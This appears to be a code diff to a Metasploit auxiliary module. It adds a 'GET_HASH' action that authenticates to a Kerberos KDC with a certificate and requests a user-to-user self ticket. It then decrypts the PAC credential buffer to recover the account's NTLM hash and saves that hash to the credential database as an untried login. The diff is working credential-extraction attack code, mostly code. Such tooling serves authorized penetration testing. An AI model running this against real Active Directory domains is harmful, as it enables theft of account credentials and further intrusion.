@@ -36,6 +36,7 @@ class MetasploitModule < Msf::Auxiliary
         'Actions' => [
           [ 'GET_TGT', { 'Description' => 'Request a Ticket-Granting-Ticket (TGT)' } ],
           [ 'GET_TGS', { 'Description' => 'Request a Ticket-Granting-Service (TGS)' } ],
+          [ 'GET_HASH', { 'Description' => 'Request a TGS to recover the NTLM hash' } ]
         ],
         'DefaultAction' => 'GET_TGT'
       )
@@ -109,20 +110,24 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if datastore['NTHASH'].present? && !datastore['NTHASH'].match(/^\h{32}$/)
-      fail_with(Msf::Exploit::Failure::BadConfig, 'NTHASH must be a hex string of 32 characters (128 bits)')
+      fail_with(Failure::BadConfig, 'NTHASH must be a hex string of 32 characters (128 bits)')
     end
 
     if datastore['AES_KEY'].present? && !datastore['AES_KEY'].match(/^(\h{32}|\h{64})$/)
-      fail_with(Msf::Exploit::Failure::BadConfig,
+      fail_with(Failure::BadConfig,
                 'AES_KEY must be a hex string of 32 characters for 128-bits AES keys or 64 characters for 256-bits AES keys')
     end
 
     if action.name == 'GET_TGS' && datastore['SPN'].blank?
-      fail_with(Failure::BadConfig, 'SPN must be provided when requiring a TGS')
+      fail_with(Failure::BadConfig, "SPN must be provided when action is #{action.name}")
+    end
+
+    if action.name == 'GET_HASH' && datastore['CERT_FILE'].blank?
+      fail_with(Failure::BadConfig, "CERT_FILE must be provided when action is #{action.name}")
     end
 
     if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+})
-      fail_with(Msf::Exploit::Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
+      fail_with(Failure::BadConfig, 'SPN format must be service_name/FQDN (ex: cifs/dc01.mydomain.local)')
     end
   end
 
@@ -226,4 +231,67 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def action_get_hash
+    authenticator = init_authenticator({ ticket_storage: kerberos_ticket_storage(read: false, write: true) })
+    auth_context = authenticator.authenticate_via_kdc(options)
+    credential = auth_context[:credential]
+
+    print_status("#{peer} - Getting NTLM hash for #{@username}@#{@realm}")
+
+    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
+      type: credential.keyblock.enctype.value,
+      value: credential.keyblock.data.value
+    )
+
+    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)
+
+    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(
+      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)
+    )
+    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value
+    pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)
+    pac_info_buffer = pac.pac_info_buffers.find do |buffer|
+      buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION
+    end
+    unless pac_info_buffer
+      print_error('NTLM hash not found in PAC')
+      return
+    end
+
+    serialized_pac_credential_data = pac_info_buffer.buffer.pac_element.decrypt_serialized_data(auth_context[:krb_enc_key][:key])
+    ntlm_hash = serialized_pac_credential_data.data.extract_ntlm_hash
+    print_good("Found NTLM hash for #{@username}: #{ntlm_hash}")
+
+    report_ntlm(ntlm_hash)
+  end
+
+  def report_ntlm(hash)
+    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: 'kerberos',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+    credential_data = {
+      module_fullname: fullname,
+      origin_type: :service,
+      private_data: hash,
+      private_type: :ntlm_hash,
+      jtr_format: jtr_format,
+      username: @username,
+      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+      realm_value: @realm
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
 end
